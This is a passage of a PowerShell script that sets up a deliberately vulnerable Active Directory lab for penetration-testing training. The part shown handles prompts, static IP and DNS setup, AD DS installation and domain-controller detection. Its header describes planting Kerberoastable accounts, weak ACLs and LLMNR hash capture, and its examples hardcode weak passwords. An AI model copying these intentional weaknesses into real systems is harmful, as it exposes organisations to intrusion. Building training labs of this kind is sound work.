<#
.SYNOPSIS
    Sets up a vulnerable Windows Active Directory environment for penetration testing training.
    
.DESCRIPTION
    This script creates a Windows AD domain, promotes the server to a DC, creates realistic
    users/groups/OUs, configures vulnerable Kerberos accounts, enables WinRM, creates SMB shares,
    and enables LLMNR/NBT-NS/mDNS to allow hash capture with responder/ntlmrelayx.
    
.PARAMETER DomainName
    The FQDN of the domain to create (e.g., "corp.local")
    
.PARAMETER SafeModePassword
    The password for Directory Services Restore Mode (DSRM) as a SecureString.
    If not provided, will prompt interactively.
    
.PARAMETER AdminPassword
    The password for the Administrator account (optional, defaults to SafeModePassword).
    If not provided, will prompt interactively.
    
.PARAMETER Stage
    Specifies which stage to run: Stage1 (install AD DS and promote to DC), Stage2 (configure AD),
    Stage3 (deploy vulnerable attack paths), or Auto (automatically detect). Default is Auto.
    
.EXAMPLE
    # Interactive mode (recommended)
    .\Setup-VulnerableAD.ps1
    
.EXAMPLE
    # Stage 1: Install AD DS and promote to DC (will reboot)
    $securePass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
    .\Setup-VulnerableAD.ps1 -Stage Stage1 -DomainName "corp.local" -SafeModePassword $securePass
    
.EXAMPLE
    # Stage 2: Configure AD (run after reboot)
    $securePass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
    .\Setup-VulnerableAD.ps1 -Stage Stage2 -DomainName "corp.local" -SafeModePassword $securePass
    
.EXAMPLE
    # Stage 3: Deploy advanced vulnerable attack paths (run after Stage 2)
    .\Setup-VulnerableAD.ps1 -Stage Stage3
    
.EXAMPLE
    # Auto mode (detects which stage to run)
    $securePass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
    .\Setup-VulnerableAD.ps1 -DomainName "corp.local" -SafeModePassword $securePass
    
.NOTES
    STAGES:
    - Stage1: Installs AD DS role, DNS, and promotes server to Domain Controller (reboots)
    - Stage2: Creates OUs, users, groups, shares, and configures vulnerable settings
    - Stage3: Deploys advanced vulnerable attack paths (delegation, ACLs, GPOs, etc.)
    - Auto: Automatically detects which stage to run based on DC status
    
    If parameters are not provided, the script will prompt for them interactively.
    
.NOTES
    PRIVILEGES REQUIRED:
    - Stage1: Local Administrator privileges (required for installing roles and promoting to DC)
    - Stage2: Domain Administrator privileges (required for creating OUs, users, groups, etc.)
    - Stage3: Domain Administrator privileges (required for configuring delegation, ACLs, GPOs, etc.)
    
    NOTE: After DC promotion, the local Administrator account becomes the domain Administrator,
    so you can run both stages as the same Administrator account.
    
    Requires: Windows Server 2022, Administrator privileges, Internet connection for AD DS installation
    Author: Security Training Lab Setup
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$DomainName,
    
    [Parameter(Mandatory=$false)]
    [SecureString]$SafeModePassword,
    
    [Parameter(Mandatory=$false)]
    [SecureString]$AdminPassword,
    
    [Parameter(Mandatory=$false)]
    [ValidateSet("Stage1", "Stage2", "Stage3", "Auto")]
    [string]$Stage = "Auto"
)

#Requires -RunAsAdministrator

# Set error action preference
$ErrorActionPreference = "Stop"

# Function to write colored output
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

# Function to prompt for missing parameters interactively
function Get-InteractiveParameters {
    param(
        [string]$Stage = "Auto"
    )
    
    Write-ColorOutput "" "White"
    Write-ColorOutput "========================================" "Cyan"
    Write-ColorOutput "  Vulnerable AD Lab Setup - Interactive" "Cyan"
    Write-ColorOutput "========================================" "Cyan"
    Write-ColorOutput "" "White"
    
    # For Stage 2 and Stage 3, try to auto-detect domain name from AD
    if (($Stage -eq "Stage2" -or $Stage -eq "Stage3") -and -not $DomainName) {
        Write-ColorOutput "[*] Stage $Stage : Attempting to auto-detect domain name..." "Yellow"
        try {
            # Try to get domain from registry (works even if ADWS isn't ready)
            $dcRegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
            if (Test-Path $dcRegistryPath) {
                $dcDnsRoot = Get-ItemProperty -Path $dcRegistryPath -Name "DnsRoot" -ErrorAction SilentlyContinue
                if ($dcDnsRoot -and $dcDnsRoot.DnsRoot) {
                    $DomainName = $dcDnsRoot.DnsRoot
                    Write-ColorOutput "[+] Auto-detected domain: $DomainName" "Green"
                }
            }
            
            # If registry method didn't work, try AD (if ADWS is available)
            if (-not $DomainName) {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $domain = Get-ADDomain -ErrorAction SilentlyContinue
                if ($domain) {
                    $DomainName = $domain.DNSRoot
                    Write-ColorOutput "[+] Auto-detected domain: $DomainName" "Green"
                }
            }
            
            # Fallback to computer domain
            if (-not $DomainName) {
                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
                $currentDomain = $computerSystem.Domain
                if ($currentDomain -and $currentDomain -ne "WORKGROUP") {
                    $DomainName = $currentDomain
                    Write-ColorOutput "[+] Using computer domain: $DomainName" "Green"
                }
            }
        } catch {
            Write-ColorOutput "[*] Could not auto-detect domain name" "Yellow"
        }
    }
    
    # Prompt for DomainName if not provided and not auto-detected
    if (-not $DomainName) {
        Write-ColorOutput "[?] Enter the domain name (e.g., corp.local): " "Yellow" -NoNewline
        $DomainName = Read-Host
        if ([string]::IsNullOrWhiteSpace($DomainName)) {
            Write-ColorOutput "[!] Domain name is required!" "Red"
            exit 1
        }
    }
    
    # For Stage 2 and Stage 3, SafeModePassword is not needed (only needed for Stage 1)
    if ($Stage -ne "Stage2" -and $Stage -ne "Stage3" -and -not $SafeModePassword) {
        Write-ColorOutput "[?] Enter the Safe Mode (DSRM) password: " "Yellow" -NoNewline
        $SafeModePassword = Read-Host -AsSecureString
        if (-not $SafeModePassword -or $SafeModePassword.Length -eq 0) {
            Write-ColorOutput "[!] Safe Mode password is required!" "Red"
            exit 1
        }
        
        # Confirm password
        Write-ColorOutput "[?] Confirm the Safe Mode password: " "Yellow" -NoNewline
        $confirmPassword = Read-Host -AsSecureString
        
        $BSTR1 = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SafeModePassword)
        $BSTR2 = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($confirmPassword)
        $plain1 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR1)
        $plain2 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR2)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR1)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR2)
        
        if ($plain1 -ne $plain2) {
            Write-ColorOutput "[!] Passwords do not match!" "Red"
            exit 1
        }
    } elseif (($Stage -eq "Stage2" -or $Stage -eq "Stage3") -and -not $SafeModePassword) {
        # For Stage 2 and Stage 3, SafeModePassword is optional - create a dummy one if needed
        Write-ColorOutput "[*] Stage $Stage : Safe Mode password not required (only needed for Stage 1)" "Yellow"
        # Create a dummy SecureString to avoid null reference issues
        $SafeModePassword = ConvertTo-SecureString "DummyPassword123!" -AsPlainText -Force
    }
    
    # For Stage 2 and Stage 3, AdminPassword is not needed (was set in Stage 1)
    if ($Stage -ne "Stage2" -and $Stage -ne "Stage3" -and -not $AdminPassword) {
        Write-ColorOutput "[?] Use the same password for Administrator account? (Y/N, default: Y): " "Yellow" -NoNewline
        $useSamePass = Read-Host
        if ($useSamePass -and ($useSamePass -match '^[Nn]')) {
            Write-ColorOutput "[?] Enter the Administrator password: " "Yellow" -NoNewline
            $AdminPassword = Read-Host -AsSecureString
            if (-not $AdminPassword -or $AdminPassword.Length -eq 0) {
                Write-ColorOutput "[*] No password entered, using Safe Mode password" "Yellow"
                $AdminPassword = $SafeModePassword
            }
        } else {
            $AdminPassword = $SafeModePassword
            Write-ColorOutput "[*] Using Safe Mode password for Administrator account" "Yellow"
        }
    } elseif (($Stage -eq "Stage2" -or $Stage -eq "Stage3") -and -not $AdminPassword) {
        # For Stage 2 and Stage 3, AdminPassword is not needed - use dummy or SafeModePassword
        Write-ColorOutput "[*] Stage $Stage : Administrator password not required (was set in Stage 1)" "Yellow"
        $AdminPassword = $SafeModePassword
    }
    
    Write-ColorOutput "" "White"
    Write-ColorOutput "[+] Parameters collected:" "Green"
    Write-ColorOutput "    Domain Name: $DomainName" "White"
    if ($Stage -ne "Stage2" -and $Stage -ne "Stage3") {
        Write-ColorOutput "    Safe Mode Password: ********" "White"
    }
    Write-ColorOutput "" "White"
    
    return @{
        DomainName = $DomainName
        SafeModePassword = $SafeModePassword
        AdminPassword = $AdminPassword
    }
}

# Determine effective stage for parameter collection
# For Auto mode, check if we're a DC to determine if we need Stage 2 or Stage 3 parameters
$effectiveStage = $Stage
if ($Stage -eq "Auto") {
    # Quick check to see if we're a DC (without ADWS check)
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $currentDomain = $computerSystem.Domain
    $isInWorkgroup = ($currentDomain -eq "WORKGROUP" -or $currentDomain -eq "")
    
    if (-not $isInWorkgroup) {
        # We're in a domain, check if Stage 2 or Stage 3
        $ntdsService = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
        if ($ntdsService) {
            # Try to check if Stage 2 is complete (check for vulnerable users)
            try {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $vulnUsers = Get-ADUser -Filter "Name -eq 'svc_backup'" -ErrorAction SilentlyContinue
                if ($vulnUsers) {
                    $effectiveStage = "Stage3"
                } else {
                    $effectiveStage = "Stage2"
                }
            } catch {
                # ADWS not available, assume Stage 2
                $effectiveStage = "Stage2"
            }
        }
    }
}

# Collect parameters interactively if not provided
# Pass effective stage so function knows what to prompt for
$params = Get-InteractiveParameters -Stage $effectiveStage
$DomainName = $params.DomainName
$SafeModePassword = $params.SafeModePassword
$AdminPassword = $params.AdminPassword

# Function to check if running as administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to configure network adapter with static IP and DNS
function Set-NetworkConfiguration {
    Write-ColorOutput "[*] Configuring network adapter with static IP and DNS..." "Yellow"
    Write-ColorOutput "" "White"
    
    try {
        # Get all physical network adapters (exclude virtual adapters)
        $physicalAdapters = Get-NetAdapter | Where-Object { 
            $_.PhysicalMediaType -ne "Unknown" -and 
            $_.InterfaceDescription -notlike "*Virtual*" -and
            $_.InterfaceDescription -notlike "*Hyper-V*" -and
            $_.InterfaceDescription -notlike "*VMware*" -and
            $_.InterfaceDescription -notlike "*VirtualBox*"
        } | Sort-Object Name
        
        if ($physicalAdapters.Count -eq 0) {
            # Fallback to any adapter if no physical ones found
            Write-ColorOutput "  [*] No physical adapters found, using all adapters..." "Yellow"
            $physicalAdapters = Get-NetAdapter | Sort-Object Name
        }
        
        if ($physicalAdapters.Count -eq 0) {
            Write-ColorOutput "  [!] No network adapters found" "Red"
            return $false
        }
        
        # Display available adapters with their IP addresses
        Write-ColorOutput "  [*] Available Network Adapters:" "Yellow"
        Write-ColorOutput "" "White"
        
        $adapterList = @()
        $index = 1
        
        foreach ($adap in $physicalAdapters) {
            $adapterIPs = Get-NetIPAddress -InterfaceAlias $adap.Name -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254.*" }
            $adapterGateway = (Get-NetRoute -InterfaceAlias $adap.Name -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue).NextHop
            $status = $adap.Status
            $macAddress = $adap.MacAddress
            
            $ipInfo = "No IP assigned"
            $prefixInfo = ""
            if ($adapterIPs) {
                $primaryIP = $adapterIPs | Select-Object -First 1
                $ipInfo = $primaryIP.IPAddress
                $prefixInfo = "/$($primaryIP.PrefixLength)"
            }
            
            $gatewayInfo = if ($adapterGateway) { "Gateway: $adapterGateway" } else { "No Gateway" }
            
            Write-ColorOutput "    [$index] $($adap.Name)" "Cyan"
            Write-ColorOutput "        Status: $status | MAC: $macAddress" "White"
            Write-ColorOutput "        IP: $ipInfo$prefixInfo | $gatewayInfo" "White"
            
            $adapterList += @{
                Index = $index
                Adapter = $adap
                CurrentIP = if ($adapterIPs) { ($adapterIPs | Select-Object -First 1) } else { $null }
                CurrentGateway = $adapterGateway
            }
            
            $index++
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "  [*] Step 1: Select Network Adapter and IP Configuration" "Yellow"
        Write-ColorOutput "" "White"
        
        # Prompt user to select adapter
        Write-ColorOutput "  [?] Select adapter number (1-$($adapterList.Count)): " "Yellow" -NoNewline
        $selectedIndex = Read-Host
        $selectedIndex = [int]$selectedIndex
        
        if ($selectedIndex -lt 1 -or $selectedIndex -gt $adapterList.Count) {
            Write-ColorOutput "  [!] Invalid selection!" "Red"
            return $false
        }
        
        $selectedAdapterInfo = $adapterList[$selectedIndex - 1]
        $adapter = $selectedAdapterInfo.Adapter
        $currentIP = $selectedAdapterInfo.CurrentIP
        $currentGateway = $selectedAdapterInfo.CurrentGateway
        
        Write-ColorOutput "  [+] Selected adapter: $($adapter.Name)" "Green"
        Write-ColorOutput "" "White"
        
        # Determine IP configuration method
        $useCurrentIP = $false
        $staticIP = $null
        $staticPrefix = $null
        $staticGateway = $null
        $currentIPAddress = $null
        $currentPrefixLength = $null
        
        if ($currentIP) {
            $currentIPAddress = $currentIP.IPAddress
            $currentPrefixLength = $currentIP.PrefixLength
            
            Write-ColorOutput "  [*] Current IP Configuration:" "Yellow"
            Write-ColorOutput "    IP Address: $currentIPAddress/$currentPrefixLength" "White"
            if ($currentGateway) {
                Write-ColorOutput "    Gateway: $currentGateway" "White"
            }
            Write-ColorOutput "" "White"
            
            Write-ColorOutput "  [?] Use current IP address? (Y/N, default: Y): " "Yellow" -NoNewline
            $useCurrentResponse = Read-Host
            if ([string]::IsNullOrWhiteSpace($useCurrentResponse) -or $useCurrentResponse -match '^[Yy]') {
                $useCurrentIP = $true
                $staticIP = $currentIPAddress
                $staticPrefix = $currentPrefixLength
                $staticGateway = $currentGateway
                Write-ColorOutput "  [+] Using current IP address: $staticIP/$staticPrefix" "Green"
            }
        }
        
        # If not using current IP, prompt for manual configuration
        if (-not $useCurrentIP) {
            Write-ColorOutput "" "White"
            Write-ColorOutput "  [*] Manual IP Configuration" "Yellow"
            Write-ColorOutput "" "White"
            
            # Prompt for IP address
            if ($currentIP -and $currentIPAddress) {
                Write-ColorOutput "  [?] Enter static IP address (press Enter to use current: $currentIPAddress): " "Yellow" -NoNewline
            } else {
                Write-ColorOutput "  [?] Enter static IP address (e.g., 192.168.1.10): " "Yellow" -NoNewline
            }
            $staticIP = Read-Host
            if ([string]::IsNullOrWhiteSpace($staticIP) -and $currentIP -and $currentIPAddress) {
                $staticIP = $currentIPAddress
            }
            if ([string]::IsNullOrWhiteSpace($staticIP)) {
                Write-ColorOutput "  [!] IP address is required!" "Red"
                return $false
            }
            
            # Prompt for subnet mask prefix length
            if ($currentIP -and $currentPrefixLength) {
                Write-ColorOutput "  [?] Enter subnet mask prefix length (press Enter to use current: $currentPrefixLength): " "Yellow" -NoNewline
            } else {
                Write-ColorOutput "  [?] Enter subnet mask prefix length (e.g., 24 for 255.255.255.0): " "Yellow" -NoNewline
            }
            $staticPrefix = Read-Host
            if ([string]::IsNullOrWhiteSpace($staticPrefix) -and $currentIP -and $currentPrefixLength) {
                $staticPrefix = $currentPrefixLength
            }
            if ([string]::IsNullOrWhiteSpace($staticPrefix)) {
                Write-ColorOutput "  [!] Subnet mask prefix length is required!" "Red"
                return $false
            }
            
            # Prompt for default gateway
            if ($currentGateway) {
                Write-ColorOutput "  [?] Enter default gateway (press Enter to use current: $currentGateway): " "Yellow" -NoNewline
            } else {
                Write-ColorOutput "  [?] Enter default gateway (e.g., 192.168.1.1, or press Enter to skip): " "Yellow" -NoNewline
            }
            $staticGateway = Read-Host
            if ([string]::IsNullOrWhiteSpace($staticGateway) -and $currentGateway) {
                $staticGateway = $currentGateway
            }
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "  [*] Configuring static IP address..." "Yellow"
        Write-ColorOutput "    [*] Adapter: $($adapter.Name)" "White"
        Write-ColorOutput "    [*] IP Address: $staticIP/$staticPrefix" "White"
        if ($staticGateway) {
            Write-ColorOutput "    [*] Gateway: $staticGateway" "White"
        }
        
        # Remove any existing IP addresses to set static
        $existingIPs = Get-NetIPAddress -InterfaceAlias $adapter.Name -AddressFamily IPv4 -ErrorAction SilentlyContinue
        foreach ($ip in $existingIPs) {
            if ($ip.IPAddress -notlike "169.254.*") {
                Remove-NetIPAddress -InterfaceAlias $adapter.Name -IPAddress $ip.IPAddress -PrefixLength $ip.PrefixLength -Confirm:$false -ErrorAction SilentlyContinue
            }
        }
        
        # Configure static IP
        if ($staticGateway) {
            New-NetIPAddress -InterfaceAlias $adapter.Name -IPAddress $staticIP -PrefixLength $staticPrefix -DefaultGateway $staticGateway -ErrorAction Stop | Out-Null
            Write-ColorOutput "    [+] Static IP address configured with gateway" "Green"
        } else {
            New-NetIPAddress -InterfaceAlias $adapter.Name -IPAddress $staticIP -PrefixLength $staticPrefix -ErrorAction Stop | Out-Null
            Write-ColorOutput "    [+] Static IP address configured (no gateway)" "Green"
        }
        
        # Wait a moment for IP to be applied
        Start-Sleep -Seconds 2
        
        # Verify static IP configuration
        $verifyIP = Get-NetIPAddress -InterfaceAlias $adapter.Name -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -eq $staticIP }
        if ($verifyIP) {
            Write-ColorOutput "    [+] IP configuration verified: $($verifyIP.IPAddress)/$($verifyIP.PrefixLength)" "Green"
            if ($staticGateway) {
                $verifyGateway = (Get-NetRoute -InterfaceAlias $adapter.Name -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue).NextHop
                if ($verifyGateway -eq $staticGateway) {
                    Write-ColorOutput "    [+] Gateway verified: $verifyGateway" "Green"
                } else {
                    Write-ColorOutput "    [!] Gateway may not be set correctly (expected: $staticGateway, found: $verifyGateway)" "Yellow"
                }
            }
        } else {
            Write-ColorOutput "    [!] Warning: Could not verify IP configuration" "Yellow"
        }
        
        # Use the static IP we just configured for DNS
        $configuredIP = $staticIP
        
        # Step 2: Configure DNS Servers (after static IP is set)
        Write-ColorOutput "" "White"
        Write-ColorOutput "  [*] Step 2: Configuring DNS Servers..." "Yellow"
        
        # Always configure DNS servers to ensure correct order:
        # Primary DNS = Static IP address (this server)
        # Secondary DNS = 8.8.8.8 (Google)
        Write-ColorOutput "    [*] Primary DNS: $configuredIP (this server)" "Yellow"
        Write-ColorOutput "    [*] Secondary DNS: 8.8.8.8 (Google)" "Yellow"
        
        # Remove any existing DNS server addresses first
        try {
            Remove-DnsClientServerAddress -InterfaceAlias $adapter.Name -AddressFamily IPv4 -Confirm:$false -ErrorAction SilentlyContinue
        } catch {
            # Ignore errors if no DNS servers are configured
        }
        
        # Configure DNS servers with correct order (primary first, secondary second)
        Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($configuredIP, "8.8.8.8") -ErrorAction Stop
        Write-ColorOutput "    [+] DNS servers configured successfully" "Green"
        
        # Verify DNS configuration
        Start-Sleep -Seconds 1
        $verifyDNS = Get-DnsClientServerAddress -InterfaceAlias $adapter.Name -AddressFamily IPv4 -ErrorAction SilentlyContinue
        if ($verifyDNS -and $verifyDNS.ServerAddresses.Count -ge 2) {
            $primaryDNS = $verifyDNS.ServerAddresses[0]
            $secondaryDNS = $verifyDNS.ServerAddresses[1]
            if ($primaryDNS -eq $configuredIP -and $secondaryDNS -eq "8.8.8.8") {
                Write-ColorOutput "    [+] DNS configuration verified: Primary=$primaryDNS, Secondary=$secondaryDNS" "Green"
            } else {
                Write-ColorOutput "    [!] DNS configuration may not be in correct order" "Yellow"
                Write-ColorOutput "    [*] Primary: $primaryDNS, Secondary: $secondaryDNS" "Yellow"
            }
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "  [+] Network configuration complete" "Green"
        Write-ColorOutput "    [*] Static IP: $configuredIP" "White"
        Write-ColorOutput "    [*] Primary DNS: $configuredIP" "White"
        Write-ColorOutput "    [*] Secondary DNS: 8.8.8.8" "White"
        
        return $true
    } catch {
        Write-ColorOutput "  [!] Error configuring network: $($_.Exception.Message)" "Red"
        Write-ColorOutput "  [*] You may need to configure network settings manually:" "Yellow"
        Write-ColorOutput "    - Set static IP address" "White"
        Write-ColorOutput "    - Primary DNS: <This server's IP>" "White"
        Write-ColorOutput "    - Secondary DNS: 8.8.8.8" "White"
        return $false
    }
}

# Function to install AD DS role and all required components
function Install-ADDSRole {
    Write-ColorOutput "[*] Installing Active Directory Domain Services and required components..." "Yellow"
    
    $featuresToInstall = @()
    $featuresInstalled = @()
    
    # Check and install AD-Domain-Services
    $adDS = Get-WindowsFeature -Name AD-Domain-Services
    if ($adDS.InstallState -ne "Installed") {
        Write-ColorOutput "  [*] Installing AD-Domain-Services..." "Yellow"
        $featuresToInstall += "AD-Domain-Services"
    } else {
        Write-ColorOutput "  [+] AD-Domain-Services is already installed" "Green"
        $featuresInstalled += "AD-Domain-Services"
    }
    
    # Check and install DNS Server (required for AD)
    $dns = Get-WindowsFeature -Name DNS
    if ($dns.InstallState -ne "Installed") {
        Write-ColorOutput "  [*] Installing DNS Server..." "Yellow"
        $featuresToInstall += "DNS"
    } else {
        Write-ColorOutput "  [+] DNS Server is already installed" "Green"
        $featuresInstalled += "DNS"
    }
    
    # Check and install RSAT-ADDS (AD DS Management Tools)
    $rsatADDS = Get-WindowsFeature -Name RSAT-ADDS
    if ($rsatADDS.InstallState -ne "Installed") {
        Write-ColorOutput "  [*] Installing RSAT-ADDS (AD DS Management Tools)..." "Yellow"
        $featuresToInstall += "RSAT-ADDS"
    } else {
        Write-ColorOutput "  [+] RSAT-ADDS is already installed" "Green"
        $featuresInstalled += "RSAT-ADDS"
    }
    
    # Check and install RSAT-ADDS-Tools (Additional AD Tools)
    $rsatADDSTools = Get-WindowsFeature -Name RSAT-ADDS-Tools -ErrorAction SilentlyContinue
    if ($rsatADDSTools -and $rsatADDSTools.InstallState -ne "Installed") {
        Write-ColorOutput "  [*] Installing RSAT-ADDS-Tools..." "Yellow"
        $featuresToInstall += "RSAT-ADDS-Tools"
    } elseif ($rsatADDSTools) {
        Write-ColorOutput "  [+] RSAT-ADDS-Tools is already installed" "Green"
        $featuresInstalled += "RSAT-ADDS-Tools"
    }
    
    # Check and install RSAT-DNS-Server (DNS Management Tools)
    $rsatDNS = Get-WindowsFeature -Name RSAT-DNS-Server -ErrorAction SilentlyContinue
    if ($rsatDNS -and $rsatDNS.InstallState -ne "Installed") {
        Write-ColorOutput "  [*] Installing RSAT-DNS-Server..." "Yellow"
        $featuresToInstall += "RSAT-DNS-Server"
    } elseif ($rsatDNS) {
        Write-ColorOutput "  [+] RSAT-DNS-Server is already installed" "Green"
        $featuresInstalled += "RSAT-DNS-Server"
    }
    
    # Install all required features
    if ($featuresToInstall.Count -gt 0) {
        Write-ColorOutput "[*] Installing the following features: $($featuresToInstall -join ', ')" "Yellow"
        Write-ColorOutput "[*] This may take several minutes. Please wait..." "Yellow"
        Write-ColorOutput "" "White"
        
        # Install AD-Domain-Services with management tools
        if ($featuresToInstall -contains "AD-Domain-Services") {
            Write-ColorOutput "  [*] Installing AD-Domain-Services (this may take 5-10 minutes)..." "Yellow"
            $job = Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools -IncludeAllSubFeature
            if ($job.RestartNeeded -eq "Yes") {
                Write-ColorOutput "  [+] AD-Domain-Services installed (reboot may be required)" "Green"
            } else {
                Write-ColorOutput "  [+] AD-Domain-Services installed successfully" "Green"
            }
        }
        
        # Install DNS Server
        if ($featuresToInstall -contains "DNS") {
            Write-ColorOutput "  [*] Installing DNS Server..." "Yellow"
            $job = Install-WindowsFeature -Name DNS -IncludeManagementTools -IncludeAllSubFeature
            Write-ColorOutput "  [+] DNS Server installed successfully" "Green"
        }
        
        # Install RSAT features
        $rsatFeatures = $featuresToInstall | Where-Object { $_ -like "RSAT-*" }
        if ($rsatFeatures.Count -gt 0) {
            Write-ColorOutput "  [*] Installing RSAT management tools..." "Yellow"
            foreach ($feature in $rsatFeatures) {
                Write-ColorOutput "    [*] Installing $feature..." "Yellow"
                Install-WindowsFeature -Name $feature -IncludeAllSubFeature | Out-Null
                Write-ColorOutput "    [+] $feature installed" "Green"
            }
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "[+] All required features installed successfully" "Green"
    } else {
        Write-ColorOutput "[+] All required features are already installed" "Green"
    }
    
    # Verify critical services
    Write-ColorOutput "[*] Verifying required services..." "Yellow"
    $services = @(
        @{Name="NTDS"; DisplayName="Active Directory Domain Services"},
        @{Name="DNS"; DisplayName="DNS Server"},
        @{Name="ADWS"; DisplayName="Active Directory Web Services"}
    )
    
    foreach ($service in $services) {
        $svc = Get-Service -Name $service.Name -ErrorAction SilentlyContinue
        if ($svc) {
            Write-ColorOutput "  [+] Service found: $($service.DisplayName)" "Green"
        } else {
            Write-ColorOutput "  [!] Service not found: $($service.DisplayName) (may start after DC promotion)" "Yellow"
        }
    }
    
    # Wait a moment for services to initialize
    Write-ColorOutput "[*] Waiting for services to initialize..." "Yellow"
    Start-Sleep -Seconds 15
    
    Write-ColorOutput "[+] AD DS installation and verification complete" "Green"
}

# Function to check if server is already a DC
function Test-IsDomainController {
    param(
        [switch]$SkipADWSCheck = $false
    )
    
    # Multiple checks to verify if server is actually a DC
    
    # Check 0: Verify computer is actually in a domain (not WORKGROUP)
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $currentDomain = $computerSystem.Domain
    $isInWorkgroup = ($currentDomain -eq "WORKGROUP" -or $currentDomain -eq "")
    
    if ($isInWorkgroup) {
        Write-ColorOutput "  [*] Computer is in WORKGROUP - not a DC (domain: $currentDomain)" "Yellow"
        # Even if other checks pass, if we're in WORKGROUP, DC promotion didn't complete
        return $false
    }
    
    # Check 1: NTDS service exists (only exists after DC promotion)
    $ntdsService = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
    if (-not $ntdsService) {
        Write-ColorOutput "  [*] NTDS service not found - server is not a DC" "Yellow"
        return $false
    }
    
    # Check 2: Registry check for DC configuration
    $dcRegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
    if (Test-Path $dcRegistryPath) {
        $dcDnsRoot = Get-ItemProperty -Path $dcRegistryPath -Name "DnsRoot" -ErrorAction SilentlyContinue
        if ($dcDnsRoot -and $dcDnsRoot.DnsRoot) {
            Write-ColorOutput "  [*] DC registry configuration found - server is a DC (domain: $($dcDnsRoot.DnsRoot))" "Yellow"
            # Verify the domain matches
            if ($currentDomain -like "*$($dcDnsRoot.DnsRoot)*" -or $currentDomain -eq $dcDnsRoot.DnsRoot) {
                return $true
            } else {
                Write-ColorOutput "  [!] Domain mismatch: Registry shows $($dcDnsRoot.DnsRoot) but computer is in $currentDomain" "Yellow"
            }
        }
    }
    
    # Check 3: DomainRole check (but only if we're in a domain)
    $dcRole = $computerSystem.DomainRole
    # DomainRole values: 0=Standalone, 1=Member, 2=Standalone DC, 3=Member DC, 4=Backup DC, 5=Primary DC
    if ($dcRole -ge 2 -and -not $isInWorkgroup) {
        Write-ColorOutput "  [*] DomainRole indicates DC status - server appears to be a DC (role: $dcRole, domain: $currentDomain)" "Yellow"
        # But we need to verify it's actually in the domain, not just that the role is set
        return $true
    }
    
    # Check 4: Try to access AD (if AD Web Services is available) - Skip this if requested
    if (-not $SkipADWSCheck) {
        try {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            $domain = Get-ADDomain -ErrorAction SilentlyContinue
            if ($domain) {
                Write-ColorOutput "  [*] Can access AD domain - server is a DC (domain: $($domain.DNSRoot))" "Yellow"
                # Verify computer is actually in this domain
                if ($currentDomain -like "*$($domain.DNSRoot)*" -or $currentDomain -eq $domain.DNSRoot) {
                    return $true
                } else {
                    Write-ColorOutput "  [!] Domain mismatch: AD shows $($domain.DNSRoot) but computer is in $currentDomain" "Yellow"
                }
            }
        } catch {
            # AD not accessible, not a DC or services not running
            # This is expected if ADWS is not available yet (e.g., after reboot)
        }
    } else {
        Write-ColorOutput "  [*] Skipping ADWS check (AD Web Services may not be available yet)" "Yellow"
    }
    
    # If we get here, server is not a DC
    return $false
}

# Function to check and start AD Web Services
function Start-ADWebServices {
    Write-ColorOutput "[*] Checking AD Web Services status..." "Yellow"
    
    $adwsService = Get-Service -Name "ADWS" -ErrorAction SilentlyContinue
    if (-not $adwsService) {
        Write-ColorOutput "  [!] AD Web Services (ADWS) service not found" "Red"
        Write-ColorOutput "  [*] This may indicate AD DS is not fully installed or configured" "Yellow"
        return $false
    }
    
    Write-ColorOutput "  [*] AD Web Services found (Status: $($adwsService.Status))" "Yellow"
    
    if ($adwsService.Status -ne "Running") {
        Write-ColorOutput "  [*] Attempting to start AD Web Services..." "Yellow"
        try {
            Start-Service -Name "ADWS" -ErrorAction Stop
            Write-ColorOutput "  [+] AD Web Services started successfully" "Green"
            Start-Sleep -Seconds 5
            return $true
        } catch {
            Write-ColorOutput "  [!] Failed to start AD Web Services: $($_.Exception.Message)" "Red"
            Write-ColorOutput "  [*] Service may need to be started manually or may have dependencies" "Yellow"
            return $false
        }
    } else {
        Write-ColorOutput "  [+] AD Web Services is already running" "Green"
        return $true
    }
}

# Function to wait for AD Web Services to be available
function Wait-ADWebServices {
    param(
        [int]$MaxWaitSeconds = 300,
        [int]$RetryIntervalSeconds = 5
    )
    
    Write-ColorOutput "[*] Waiting for Active Directory Web Services to be available..." "Yellow"
    
    # First, try to start the service if it's not running
    Start-ADWebServices | Out-Null
    
    # Check other required services
    Write-ColorOutput "[*] Checking required AD services..." "Yellow"
